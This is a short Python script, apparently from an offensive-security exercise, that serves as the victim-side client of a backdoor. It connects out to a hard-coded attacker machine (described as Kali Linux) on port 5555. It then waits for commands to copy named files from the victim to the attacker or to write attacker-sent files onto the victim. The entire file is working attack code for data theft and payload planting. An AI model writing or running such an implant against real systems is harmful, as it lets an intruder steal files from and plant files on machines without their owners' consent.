import socket
import json
import os

SERVER_IP = '10.0.1.37'  # IP of my Kali Linux machine
SERVER_PORT = 5555

def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(filename):
    file = open(filename, 'rb')
    target_sock.send(file.read())
    file.close()

def download_file(filename, destination):
    if destination:
        filepath = os.path.join(destination, os.path.basename(filename))
    else:
        filepath = filename
    file = open(filepath, 'wb')
    target_sock.settimeout(1)
    chunk = target_sock.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = target_sock.recv(1024)
        except socket.timeout:
            break
    target_sock.settimeout(None)
    file.close()

def shell():
    while True:
        command = reliable_recv()
        if command[:9] == 'download ':
            upload_file(command[9:])
        elif command[:7] == 'upload ':
            args = command[7:].split(' -d ')
            filename = args[0]
            destination = args[1] if len(args) > 1 else None
            download_file(filename, destination)
        else:
            break

target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target_sock.connect((SERVER_IP, SERVER_PORT))
shell()
target_sock.close()
